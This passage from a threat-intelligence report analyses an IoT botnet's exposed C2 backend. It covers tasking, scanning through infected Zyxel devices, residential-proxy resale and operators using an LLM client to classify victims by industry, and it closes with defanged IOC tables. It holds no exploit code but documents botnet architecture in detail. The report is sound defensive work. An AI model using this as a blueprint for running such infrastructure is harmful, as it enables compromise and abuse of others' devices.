The `c2_old` binary also contained `QQWry` references. QQWry is a Chinese IP-to-region database family used to map IP addresses to geographic or network-provider labels.

Chinese-language comments and status strings also appeared in several scripts and logs. We treat these as operator/tooling-language indicators. Examples include:

- `xserver/protocol.py`: `通信协议定义（服务端 & 客户端共用）` => communication protocol definition shared by server and client
- `nmap/ikuai_get _version.py`: `开始扫描 ... 个目标` => start scanning ... targets
- `nmap/ikuai_get _version.py`: `[成功]` => success
- `nmap/ikuai_get _version.py`: `[失败]` => failure
- `wget/totolink/asp/1.sh`: `下载 mps` => download mps
- `wget/totolink/asp/1.sh`: `删除自身` => delete itself
- `move/es.log`: `任务完成` => task completed
- `move/es.log`: `发送任务结果` => send task results
- `move/es.log`: `存活 ... 个` => alive ... entries

The public-target scan workspace showed another kind of segmentation: grouping by result filename. `nmap/hosts.txt` contained 96,021 entries, while adjacent result files included `sorted_results.NoCn.txt` and `sorted_results.tw.txt`. Those names suggest operator-side grouping such as non-China and Taiwan-focused result sets. This is workflow evidence for how scan output was organized.

### 6.4 Listener and Tasking Configuration

The recovered backend stored victim records and runtime configuration. Several SQLite `.cdb` artifacts acted as runtime configuration for listener and tasking components. In local checks, changes to listener rows changed which listeners were opened by the recovered components. `xserver/ts` also bound `:8888` from values in `xserver/.cdb`. This ties the database artifacts to executable backend behavior: the exposed files were not static templates but operational C2 infrastructure.

Tasking evidence appeared across both `move/` and `xserver/`:

- `move/es_new`: task message logging and correlation with `task_results/*.json`
- `xserver/es`: POC/EXP task handlers and task-result persistence
- `xserver/ts`: batch-shell execution and shell-response handling

The recovered `move/task_results` data also included decoded `ports_detect` results. Each six-byte `raw_data` record encoded an IPv4 address followed by a TCP port, linking log counters, JSON result files, and scan-result persistence. `move/es_new` also embedded a DeepSeek-compatible LLM client: recovered Go symbols included `xserver/internal/es/ipindustry.(*llmClient).chat`, `analyzeIndustry`, `buildPrompt`, `parseResponse`, and `(*Uplink).handleIndustryDetect`, alongside embedded `deepseek-chat`, `https://api.deepseek[.]com/v1`, `Authorization`, and `Bearer` strings. The call chain covers prompt construction, an LLM chat call, response parsing, and an industry-detection handler. Taken as a whole, it points toward automated victim classification: the model is asked to label the industry or sector of a compromised host from collected metadata. We read this as target-triage tooling, not as AI-assisted exploit development.

Scanning was implemented through several paths. `move/c2old/c2_old` contained a Redis-backed bot/portscan subsystem with bot state, port-scan start/end handling, and export-to-file behavior. `move/es_new` logs recorded `ports_detect` tasks, progress callbacks, result sizes, and follow-up `download_task` messages. In `xserver/`, the concrete device-side LAN scanner was the `gogo.sh` launcher and `gogo_linux_mips` binary, described in [Section 2.2.3](#223-local-network-scanner-gogosh-and-gogo_linux_mips). On the controlled Zyxel, we observed script delivery, local scan execution, JSON result generation, and result upload back to the operator backend. Scanning therefore extended through infected devices into networks the operators could not reach directly.

The exposed dump also contained a separate `nmap/` workspace for public-target fingerprinting. We assess that workspace as distinct from the bot-driven scanner and the `gogo` LAN-scanning path.

### 6.5 Proxy and Tunnel Functions

The recovered evidence also pointed to proxy and tunneling functionality alongside implant and tasking workflows. Relevant indicators appeared across several layers:

- `xserver/ts`: proxy-message decoding paths
- Go MIPS runtime: WSS and SSH reverse-proxy functionality compatible with IPRoyal/Pawns-style residential-proxy clients
- process-memory strings: `forwarded-tcpip`, `traffic_sold`, and `access_token`

These indicators, read together, show that the operation used compromised devices for proxy or tunneling capability alongside C2 management and scanning; we limit that conclusion to the observed artifacts and devices.

### 6.6 Device-to-Dump Correlation

The device evidence and the exposed dump connect at several independent layers.

First, decoded implant configurations provided a direct network-level pivot. Among the endpoints recovered by the extractors described in [Section 2.2.1](#221-staging-implants-and-delivery-shifts) was `13.210.186[.]13:8888`, the same host and port associated with the exposed `xserver` backend from which the dump was obtained. The dump also contained an `xserver/.cdb` listener configured for port `8888`, and `xserver/ts` was observed binding that listener from the database. Second, the `gogo.sh` / `gogo_linux_mips` scanner pair matched between the device evidence and `xserver/` upload paths by hash; on the controlled Zyxel, we observed the same workflow execute and return scan output. Third, the controlled device appeared in both `move/c2old/.bdb` and `xserver/.bdb`, with victim-specific fields withheld, tying the observed device to both backend database populations.

The large Go MIPS runtime provides another direct link. The runtime recovered from the Zyxel and `xserver/ts_upload/mips` in the dump matched by SHA-256 and Go BuildID. On the device, the same runtime exposed IPRoyal/Pawns-compatible proxy behavior in process memory.

These links connect the exposed dump to the observed device activity at network, file, database, and workflow level. We therefore treat the dump as server-side operational context for the same activity, while keeping campaign naming and actor attribution out of scope.

---

## 7. Analytical Limits and Open Questions

This report is based on device-side evidence, exposed server-side files, shell history, timestamps, recovered databases, logs, and local runtime checks. These sources provide a strong view of the operator environment, but not a complete forensic image of the exposed host. The following limits define the scope of the assessment.

### Actor Identity

Recovered strings, language indicators, and workflow traces provide context about tooling and the operator environment, but they do not identify a specific actor. Identity-side telemetry and infrastructure pivots provided the initial lead, but the recovered evidence does not support naming a specific actor. We therefore keep this report focused on infrastructure, tooling, workflow, and victim-side observations.

### Database and Implant Streams

The two victim databases and the observed `hqsz` configuration identifiers are consistent with multiple streams, generations, or backend components. They do not establish a strict one-to-one mapping between implant generation and database population. The later move from `/tmp` to `/var/tmp` also changed what was visible from device logs, so server-side tokenized generation may have continued outside our device-side view.

### Proxy Runtime Provenance

The large MIPS runtime recovered from the Zyxel matched `xserver/ts_upload/mips` in the dump by hash and BuildID, and it showed IPRoyal/Pawns-compatible behavior on the device. The compared Pawns samples suggest that this runtime was not the current official Pawns client. Further provenance analysis could distinguish older official build, fork, rebuild, wrapper, or clone scenarios, but the operational linkage remains: the same proxy-capable runtime appeared on the device and in the exposed dump.

### Current Activity and Botnet Purpose

Since early July 2026, our honeypot has not observed further activity from this cluster. Before that pause, what we saw on the device was narrow: the large MIPS runtime with IPRoyal/Pawns-compatible proxy behavior accounted for nearly all observable activity, alongside a single `gogo` LAN scan. The wider capability set of the recovered backend, including tasking, POC/EXP handlers and batch shell execution, was never exercised against our device.

The two views therefore differ in scale. On the device, proxy monetization was the dominant observable behavior. In the backend, it is one function among many. Whether the proxy traffic is the business model, a side revenue stream, or cover for selective tasking of a smaller victim subset is a question a single honeypot cannot answer.

### VS Code Operator Traces

The VS Code Remote artifacts document operator workflow on the exposed host, including remote alias data, edited files, metadata probes, and tunnel-related activation artifacts. We use these traces as workflow evidence, not as proof of operator identity, workstation identity, concrete tunnel endpoints, or successful credential access.

---

## 8. Conclusion

There was no obvious malware incident at the start of this case. What we had was quiet authentication telemetry: a handful of structured login attempts that, viewed in isolation, could easily have been dismissed as noise.

The customer-approved analysis of the affected Zyxel device changed that picture. On the device, we found staged payload delivery, web-request-launched execution, decoded C2 configuration, local-network scanning, and a large MIPS runtime with proxy capability. Those artifacts showed that the authentication lead was connected to real embedded-device compromise.

The decoded implant configuration then gave us concrete infrastructure pivots. Follow-up monitoring led from the compromised device to exposed backend infrastructure. When parts of that backend became visible, we could compare the device-side evidence with server-side files instead of looking at each layer in isolation.

The exposed dump was not just a repository of payloads. It showed an operator working environment. The recovered files connected the Zyxel evidence to staging services, generated or staged MIPS artifacts, SQLite-backed victim and listener state, tasking and scan workflows, DNS and HTTP callback utilities, proxy runtime deployment, shell history, and VS Code Remote workflow traces.

Layered up, this is an operational IoT botnet environment. The operation combined payload staging, C2 state management, tasking, scanning, proxy or tunneling capability, and hands-on server administration. We do not assign a final actor name or a single campaign label, but the technical picture is clear: identity telemetry, embedded-device forensics, network staging, backend databases, and reverse-engineered C2 behavior all pointed into the same ecosystem.

The main value of this case is the connection between those layers. A weak signal in authentication telemetry became meaningful when paired with device evidence. Device evidence became actionable when decoded configurations led to infrastructure. Infrastructure exposure then showed how the backend managed victims, listeners, tasks, scans, and proxy-capable runtimes. That cross-layer chain turned a small authentication anomaly into a view of how an IoT botnet operation was built and run.

---

## 9. Infrastructure and IOC Notes

The following indicators are useful for detection and enrichment. They are defanged and should be validated against local telemetry before blocking.

### Network

| Value | Note |
| ----- | ---- |
| `38.180.190[.]115` | First observed `xserver` C2/staging generation in device and honeypot context. |
| `154.213.177[.]40` | Intermediate `xserver` C2 generation. |
| `13.210.186[.]13` | C2 generation from which the exposed dump was obtained. |
| `94.74.85[.]247` | Later active HTTP staging/check generation. |
| `log.mu091i[.]com` | DNSLog callback/check domain suffix. |
| `*.log.mu091i[.]com` | Passive-DNS pivot for botnet-member or task-callback discovery; validate against local telemetry. |
| `sd.clubde[.]xyz` | Decoded later implant C2 hostname; observed with port `8888`, and DNS later resolved it to `94.74.85[.]247`. |
| `api.iproyal[.]com` | Upstream service used by the large proxy runtime. |
| `t1.xshaon123[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `a1.xshaon123[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `t1.xmsae[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `a1.xmsae[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `t1.ishano456[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `a1.ishano456[.]sbs` | Built-in task/report host observed in `move/df/lvm01`. |
| `yy.mu091i[.]com` | Config-like domain decoded from one `df/mips` sibling. |
| `kk.t81m[.]com` | Config-like domain decoded from one `df/mips` sibling. |

### Hashes

The `zysocks5`-related file hashes and infrastructure indicators observed on the customer device are listed with context in [Section 2.1](#21-zysocks5-cluster).

| SHA-256 | File name | Note |
| ------- | --------- | ---- |
| `eb19b63001dbcd57f117e0cbd5a2b9b7a56dc4d75e8510b7d87107c6ad2e7859` | `mips` | Large Go MIPS runtime; hash-matched the infected-device artifact. |
| `98dd339e22e6fd2d8bedc5124f2b410d3f19f946abe296a95a366a0c6b4e4143` | `gogo_linux_mips` | Device-side LAN scanner binary. |
| `6e92265e1af5ead4ae28775e35940c6d9857894acc2d504d22d801b04fbc1531` | `gogo.sh` | Launcher for `gogo_linux_mips`. |



Hashes prove identity only for the exact files listed. Similar filenames elsewhere in the dump should not be treated as identical without hash comparison.

### Certificate Fingerprints

Several C2 components embedded or exposed reusable TLS material. These fingerprints are useful pivots, but they should be tied to component context because some material is present but not fully proven to be used on every path. The listed Common Names (e.g. `CN=example.com`, `CN=MyCA`, `CN=AA`, `CN=DD`, `O=Acme Co`) are the literal values extracted from the binaries and certificate material, not anonymized substitutions; their generic, template-like naming is itself notable and consistent with unmodified example or default certificates from the underlying framework code rather than operator-customized identities.


| Component                   | Certificate                             | SHA-256 fingerprint                                                                               | Notes                                                                                                                    |
| --------------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `move/c2new/c18` | Leaf `CN=example.com`, issuer `CN=MyCA` | <code>2B:45:2C:34:EE:2B:E0:D3:8E:67:8D:08:9D:24:6A:10<br>E0:04:48:FC:9B:3E:9F:93:99:13:A5:67:42:E7:F8:7C</code> | Extracted from embedded PEM chain; mTLS interaction worked with extracted material in lab.                               |
| `move/c2new/c18` | Self-signed CA `CN=MyCA`                | <code>C0:8A:C1:66:DA:A2:11:F9:38:A0:87:80:DC:DA:DC:DA<br>87:B7:36:5B:F6:C4:F9:C7:2B:22:13:59:FA:71:78:3F</code> | CA for the `example.com` chain.                                                                                          |
| `move/es_new` | Server leaf `CN=AA`, issuer `CN=DD`     | <code>97:47:F3:11:DB:F1:FC:0F:AA:3C:F1:FE:6C:F6:2F:4B<br>95:EC:AF:61:F0:E0:3F:30:57:80:62:AE:AE:4F:4F:F6</code> | Extracted from Go arena; server required client certificate.                                                             |
| `move/es_new` | Self-signed CA `CN=DD`                  | <code>15:14:CD:39:4E:6A:FA:49:33:DE:C7:3B:D5:95:00:A0<br>0A:3A:50:3E:48:9C:69:1F:9B:49:FE:F9:2B:C1:62:D4</code> | Client certificate or CA private key was not recovered.                                                                  |
| `xserver/ts` | Leaf-ish cert `CN=AA`, issuer `CN=DD`   | <code>97:47:F3:11:DB:F1:FC:0F:AA:3C:F1:FE:6C:F6:2F:4B<br>95:EC:AF:61:F0:E0:3F:30:57:80:62:AE:AE:4F:4F:F6</code> | Embedded PEM material; TeamServer TLS listener reported `mTLS=true`.                                                     |
| `xserver/ts` / `xserver/es` | Self-signed CA `CN=DD`                  | <code>15:14:CD:39:4E:6A:FA:49:33:DE:C7:3B:D5:95:00:A0<br>0A:3A:50:3E:48:9C:69:1F:9B:49:FE:F9:2B:C1:62:D4</code> | Shared CA material observed across xserver TLS components.                                                               |
| `xserver/es` | Self-signed `O=Acme Co` cert            | <code>46:81:74:FD:18:AE:99:0A:0A:1E:10:56:8E:30:F9:81<br>9A:8A:CD:23:22:4C:31:9F:4E:C3:EB:4F:6F:29:80:D9</code> | Present after unpacking; usage remains unresolved and it does not match the server RSA key used for the proven TLS path. |


### Ports

| Port | Note |
| ---- | ---- |
| `8888` | `xserver` TCP listener candidate for implant uplink. |
| `1098` | HTTP staging; dump host fingerprinted as Python `SimpleHTTPServer`, later staging process unresolved. |
| `7268` | HTTP token/check behavior; hardcoded in `httplog`. |
| `14443` | TeamServer TLS/mTLS. |
| `14444` | QUIC. |
| `33355` | ES TLS/mTLS. |
| `33356` | QUIC. |
| `15687` | `c2_old` listener. |
| `23323` | File-server role in multiple components. |
| `8765` | MikroTik brute-force service in `move/es_new`. |
| `8099` | Post/check style server behavior in file-server tooling. |
